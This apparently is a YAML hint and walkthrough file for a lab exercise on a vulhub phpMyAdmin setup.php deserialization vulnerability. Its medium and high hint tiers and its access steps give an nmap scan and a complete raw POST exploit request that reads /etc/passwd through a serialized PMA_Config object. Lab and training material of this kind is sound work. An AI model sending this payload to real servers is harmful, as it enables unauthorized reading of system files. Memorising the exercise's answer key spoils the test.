match: phpmyadmin/WooYun-2016-199433
hint_levels:
  low:
  - Inspect the phpmyadmin service or application on {{NODE_NAME}} @ {{NODE_IP}}.
  medium:
  - |-
    Catalog TCP ports: 8080. Identify the exposed services:

    ```bash
    nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
    ```
  - 'Catalog port mappings (published → container): web: 8080/tcp → container 80/tcp. These are recipe defaults;
    use the deployed service port if the scenario remaps it.'
  - 'Documented target URL(s): `http://{{NODE_IP}}:8080`.'
  high:
  - 'Vulnerability: Phpmyadmin Scripts/setup.php Deserialization Vulnerability (WooYun-2016-199433).'
  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
    substitutions.
  - |-
    Exploit

    Send the following package to read `/etc/passwd`:

    ```
    POST /scripts/setup.php HTTP/1.1
    Host: {{NODE_IP}}:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded

    action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
    ```

    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/phpmyadmin/WooYun-2016-199433/1.png
  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/phpmyadmin/WooYun-2016-199433/README.md'
access_instructions:
  title: Phpmyadmin Scripts/setup.php Deserialization Vulnerability (WooYun-2016-199433)
  steps:
  - title: Locate the target service
    instructions: |-
      Catalog TCP ports: 8080. Identify the exposed services:

      ```bash
      nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
      ```

      Catalog port mappings (published → container): web: 8080/tcp → container 80/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.

      Documented target URL(s): `http://{{NODE_IP}}:8080`.
  - title: Exploit
    instructions: |-
      Send the following package to read `/etc/passwd`:

      ```
      POST /scripts/setup.php HTTP/1.1
      Host: {{NODE_IP}}:8080
      Accept-Encoding: gzip, deflate
      Accept: */*
      Accept-Language: en
      User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
      Connection: close
      Content-Type: application/x-www-form-urlencoded

      action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
      ```

      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/phpmyadmin/WooYun-2016-199433/1.png
